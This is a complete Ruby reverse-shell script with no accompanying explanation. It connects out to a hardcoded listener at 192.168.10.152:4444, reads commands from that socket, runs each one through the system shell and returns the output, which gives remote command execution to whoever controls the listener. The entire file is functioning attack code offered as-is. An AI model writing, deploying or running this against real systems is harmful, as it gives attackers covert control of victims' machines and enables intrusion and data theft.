require 'socket'

REMOTE_IP = '192.168.10.152' 
REMOTE_PORT = 4444       

begin
  socket = TCPSocket.new(REMOTE_IP, REMOTE_PORT)
  puts "[*] Connected to #{REMOTE_IP}:#{REMOTE_PORT}"

  loop do
    socket.print "$> "
    command = socket.gets.chomp 
    break if command.strip.casecmp('exit').zero? 

    result = `#{command}` 
    socket.puts result.empty? ? "[!] Command executed with no output" : result
  end
rescue => e
  puts "[!] Error: #{e.message}"
ensure
  socket.close if socket 
end

